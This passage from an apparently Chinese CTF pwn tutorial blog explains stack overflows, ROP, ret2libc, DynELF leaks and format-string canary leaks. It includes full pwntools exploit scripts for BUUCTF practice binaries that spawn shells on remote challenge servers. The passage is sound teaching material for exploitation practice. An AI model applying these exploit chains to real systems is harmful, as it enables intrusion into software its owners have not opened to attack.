mprotect(const void *start, size_t <span class="built_in">len</span>, <span class="built_in">int</span> prot);</span><br><span class="line">argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 0x0x80EB000 (ida-ctrl+s 查看.got.plt/.bss起始地址) </span><br><span class="line">argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 <span class="number">0x1000</span> (<span class="number">0x1000</span>通过程序启动时查看该内存块的大小的到的)</span><br><span class="line">argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 <span class="number">7</span> = <span class="number">4</span> + <span class="number">2</span> +<span class="number">1</span> (rwx)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># ROPgadget --binary get_started_3dsctf_2016 --only &#x27;pop|ret&#x27; | grep pop</span></span><br><span class="line">pop3_addr = <span class="number">0x0806fcc8</span> <span class="comment"># pop esi ; pop ebx ; pop edx ; ret</span></span><br><span class="line">payload = <span class="number">0x2D</span> * <span class="string">&#x27;a&#x27;</span> + <span class="number">0x4</span> * <span class="string">&#x27;b&#x27;</span> + p32(elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">payload += p32(pop3_addr) <span class="comment"># 返回地址覆盖为pop3，目的为了栈还原，因为mprotect传入了三个参数，需要连续3个pop</span></span><br><span class="line">payload += p32(argu1) + p32(argu2) + p32(argu3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 紧接着返回地址为 read对修改的目标地址写入shellcode</span></span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>]) </span><br><span class="line">payload += p32(pop3_addr) <span class="comment"># 同样栈还原，为了执行紧接着的 目标地址</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(argu1) + p32(<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># read写完后 写入执行的目标地址</span></span><br><span class="line">payload += p32(argu1)</span><br><span class="line"><span class="comment"># 先进行sendline执行到read等待输入</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># 继续sendline发送shellcode</span></span><br><span class="line">sh.sendline(asm(shellcraft.sh(), arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>))</span><br><span class="line"><span class="comment"># 进入交互模式</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>完整 exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">proc_name = <span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span></span><br><span class="line">elf = ELF(proc_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这道题本地和远程两种解法，真的干。。。</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    sh = process(proc_name)</span><br><span class="line">str_flag_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">    backdoor_addr = <span class="number">0x080489A0</span></span><br><span class="line">    printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="number">0x2D</span> * <span class="string">&#x27;a&#x27;</span> <span class="comment"># 这边不用覆盖ebp,在于get_flag并没有push ebp</span></span><br><span class="line">    payload += p32(backdoor_addr) + p32(printf_addr)</span><br><span class="line">    payload += p32(str_flag_addr)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28308</span>)</span><br><span class="line">    mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">    read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    pop3_edi_esi_ebx_ret = <span class="number">0x0806fcc8</span></span><br><span class="line">    mem_addr = <span class="number">0x080EB000</span> <span class="comment">#.got.plt 的起始地址</span></span><br><span class="line">    mem_size = <span class="number">0x1000</span></span><br><span class="line">    mem_type = <span class="number">0x7</span> <span class="comment"># 可执行权限</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="number">0x2D</span> * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">    payload += p32(mprotect_addr)</span><br><span class="line">    payload += p32(pop3_edi_esi_ebx_ret)</span><br><span class="line">    payload += p32(mem_addr) + p32(mem_size) + p32(mem_type)</span><br><span class="line">    payload += p32(read_addr)</span><br><span class="line">    payload += p32(pop3_edi_esi_ebx_ret)</span><br><span class="line">    payload += p32(<span class="number">0</span>) + p32(mem_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line">    payload += p32(mem_addr)    <span class="comment">#将read函数的返回地址设置到我们修改的内存的地址，之后我们要往里面写入shellcode</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="comment"># read写入shellcode</span></span><br><span class="line">    payload = asm(shellcraft.sh())</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="五-32位64位栈溢出对比"><a class="markdownIt-Anchor" href="#五-32位64位栈溢出对比">#</a> 五. 32 位，64 位栈溢出对比</h2><p>32 位的函数在调用栈的时候是：</p><pre><code>   调用函数地址(父函数的栈底地址）-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1....-&gt;参数1</code></pre><p>由于在函数调用前通过 push 指令向栈中压入了数据，使得栈顶朝低地址偏移了所以在函数调用结束以后，要有恢复栈顶的过程：将通过 add esp 0x10 这条指令，即增加 esp 来恢复函数调用前的 esp。</p><p><img src="https://i.loli.net/2021/10/14/YauJBxpfHbqmUeX.png" alt="image-20211014161530117"></p><p><img src="https://i.loli.net/2021/10/14/YakGtgM3oKCUZc8.png" alt="image-20211014161545492"></p><p>64 位的函数在调用栈的时候是：</p><pre><code>   前六个参数按照约定存储在寄存器：rdi,rsi,rdx,rcx,r8,r9中。   参数超过六个的时候，第七个会压入栈中，并且先输入函数的返回地址，然后是函数的参数，之后才是函数的调用地址</code></pre><p><img src="https://i.loli.net/2021/10/14/YviIJ6DHCqbA8um.png" alt="image-20211014161246387"></p><h2 id="六-覆盖相关变量"><a class="markdownIt-Anchor" href="#六-覆盖相关变量">#</a> 六。覆盖相关变量</h2><ol><li><p>ebp</p></li><li><p>ret_addr</p></li><li><p>虚函数指针</p><p>​子类对父类的继承<br>​能够对函数进行重写<br>​由虚函数表来进行操作</p></li><li><p>SEH 链</p><p>​SEH 结构 结构 在栈中存在的 地方 ，在 在 ret_addr 和栈中数据之间 和栈中数据之间，这就导致了对于栈的安全防护 手段 ， 难以防护针对 防护针对 SEH 链的攻击</p></li><li><p>Hook 中的变量</p><p>利用方法介绍<br> 有些系统函数有预先定义好的钩子<br> 修改钩子链表中存储的子程序指针<br>影响钩子运行</p></li><li><p>fgets 的用法的时候，发现它能够避免造成溢出</p></li><li><p>程序自带的 system 函数地址</p></li><li><p>timeout: the monitored command dumped core 解决</p><p>1) 在 payload 后面加几个 ret 地址，或者加一个假的 0xdeadbeef</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>, pop_di, bin_sh_addr, system, <span class="number">0xdeadbeef</span>])</span><br></pre></td></tr></table></figure><p>2) 直接用系统函数的地址</p><h2 id="七-buuctf-例题"><a class="markdownIt-Anchor" href="#七-buuctf-例题">#</a> 七. BUUCTF 例题</h2><h3 id="1-jarvisoj-level4"><a class="markdownIt-Anchor" href="#1-jarvisoj-level4">#</a> 1. JarvisOJ level4</h3><h4 id="知识点"><a class="markdownIt-Anchor" href="#知识点">#</a> 知识点</h4><p>参考文章：<a href="https://www.anquanke.com/post/id/85129">借助 DynELF 实现无 libc 的漏洞利用小结</a></p><p>pwntools 中 DynELF 函数使用 (针对未给出 libc 文件)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">    payload=pad+p32(writeplt)+ret1+p32(<span class="number">1</span>)+p32(address)+p32(<span class="number">4</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    leak_sysaddr=io.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="comment">#print &quot;%#x =&gt; %s&quot; % (address, (leak_sysaddr or &#x27;&#x27;).encode(&#x27;hex&#x27;))   这里是测试用，可省略。</span></span><br><span class="line">    <span class="keyword">return</span> leak_sysaddr</span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&quot;对应文件&quot;</span>))</span><br><span class="line">sysaddr=d.lookup(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;libc&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pad 为填充，ret1 为有效的返回地址</p><h4 id="wp"><a class="markdownIt-Anchor" href="#wp">#</a> WP</h4><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111161018270.png" alt="image-20211116101807208"></p><p>开了 NX 保护（堆栈不可执行）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111161046138.png" alt="image-20211116104613084"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111161046265.png" alt="image-20211116104635203"></p><p>利用 DynELF 泄露 system 地址，通过 read 函数写入 /bin/sh 到 bss 段</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">conn=process(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line">pad=<span class="number">0x88</span></span><br><span class="line">write_plt=e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vul_addr=<span class="number">0x804844b</span></span><br><span class="line">bss_addr=<span class="number">0x0804a024</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">    payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span>+p32(write_plt)+p32(vul_addr)+p32(<span class="number">1</span>)+p32(address)+p32(<span class="number">4</span>)</span><br><span class="line">    conn.sendline(payload1)</span><br><span class="line">    data=conn.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> data </span><br><span class="line">d=DynELF(leak,elf=e)</span><br><span class="line">system_addr=d.lookup(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system_addr)</span><br><span class="line">read_plt=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span>+p32(read_plt)+p32(vul_addr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)</span><br><span class="line">conn.sendline(payload2)</span><br><span class="line">conn.send(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">payload3=<span class="string">&quot;a&quot;</span>*<span class="number">0x8c</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bss_addr)</span><br><span class="line">conn.sendline(payload3)</span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>常规解法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25934</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level4&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x8c</span> + p32(write_plt)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;read&quot;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x8c</span> + p32(system_addr)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="jarvisoj_level3_x64"><a class="markdownIt-Anchor" href="#jarvisoj_level3_x64">#</a> jarvisoj_level3_x64</h4><p>64 位 ret2libc（no canary found)</p><p>checksec</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170933327.png" alt="image-20211117093331127"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170933230.png" alt="image-20211117093259888"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170934032.png" alt="image-20211117093412861"></p><ol><li><p>泄露 libc</p><p>64 位汇编传参，当参数少于 7 个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为 7 个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和 32 位汇编一样。<br>我们这边要利用 write 函数去泄露 libc 版本<br> write 函数的原型，它有三个参数，所以我们这边需要用到三个寄存器去传参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t write(<span class="built_in">int</span> fd,const void*buf,size_t count);</span><br><span class="line">参数说明：</span><br><span class="line">  fd:是文件描述符（write所对应的是写，即就是<span class="number">1</span>）</span><br><span class="line">  buf:通常是一个字符串，需要写入的字符串</span><br><span class="line">  count：是每次写入的字节数</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>利用 ROPgadget 寻找 rdi,rsi 寄存器地址</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170944869.png" alt="image-20211117094445688"></p><p>WP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26919</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./level3_x64&#x27;)</span></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3_x64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.19.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0x40061A</span></span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x4006b3</span></span><br><span class="line">rsi_r15=<span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(rdi)+p64(<span class="number">1</span>)  <span class="comment">#rdi寄存器设置write函数的第一个参数为‘1’</span></span><br><span class="line">payload+=p64(rsi_r15)+p64(write_got)+p64(<span class="number">8</span>) <span class="comment">#rsi寄存器设置write函数的第二个参数为write_got表的地址，r15寄存器设置write函数的第三个参数为8</span></span><br><span class="line">payload+=p64(write_plt) <span class="comment">#去调用write函数</span></span><br><span class="line">payload+=p64(main)   <span class="comment">#控制程序流，回到main函数，继续控制</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">write_addr=u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#write_addr=u64(r.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\0&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(rdi)+p64(binsh)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="bjdctf_2020_babyrop2"><a class="markdownIt-Anchor" href="#bjdctf_2020_babyrop2">#</a> bjdctf_2020_babyrop2</h4><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171032428.png" alt="image-20211117103202380"></p><p>程序结构</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171033966.png" alt="image-20211117103343882"></p><p>init（）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171034471.png" alt="image-20211117103404402"></p><p>gift（）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171034134.png" alt="image-20211117103423993"></p><p>vuln（）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171035485.png" alt="image-20211117103501439"></p><p>在 gift 函数处存在格式化字符串漏洞，可以用来泄露 libc</p><p>在 vuln 函数处存在 buf 溢出漏洞，绕过 canary 就可以利用 ret2libc 来获取 shell</p><ol><li><p>泄露 canary 值</p><p>输入 <code>%n$p</code>  来找偏移，n 为偏移量， <code>$p</code>  定位到偏移处， <code>%p</code>  以 16 进制输出</p></li></ol><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171044092.png" alt="image-20211117104417028"></p><ol start="2"><li><p>找到一个 nop 指令下断点查看栈的情况</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171057700.png" alt="image-20211117105719634"></p></li><li><p>可以看到 6161 下面有一串 16 进制数，这个就是 canary 值，利用 %7$p 就可以泄露它的值，而且看到它在栈的位置是 0x18</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171057722.png" alt="image-20211117105745656"></p><p>泄露 canary:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%7$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>另外 pwngbd 提供了一种方便的函数 fmtarg，使用格式为 fmtarg addr。在进入 printf 函数时断下，调用 fmtarg 后可以自动计算格式化参数与 addr 的偏移。fmtarg 在计算 index 时将 RDI 也算了进去，后面会自动减一作为 %$p 的参数：</p><p><img src="https://img-blog.csdnimg.cn/20200826223512973.png#pic_center" alt="在这里插入图片描述"></p><ol start="4"><li>利用 puts 函数泄露 libc，puts 函数只有一个参数，64 位传参，利用 rdi 寄存器即可，ROPgadget 找 rdi</li></ol><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171101909.png" alt="image-20211117110117854"></p></li></ol><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./bjdctf_2020_babyrop2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25998</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop2&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%7$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">str</span>(canary)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400993</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vul_addr = <span class="number">0x400887</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload +=p64(pop_rdi)</span><br><span class="line">payload +=p64(puts_got)</span><br><span class="line">payload +=p64(puts_plt)+p64(vul_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;story!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;story!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(binsh)+p64(sys_addr)</span><br><span class="line"></span><br><span class="line">payload +=p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><p>printf 泄露真实地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 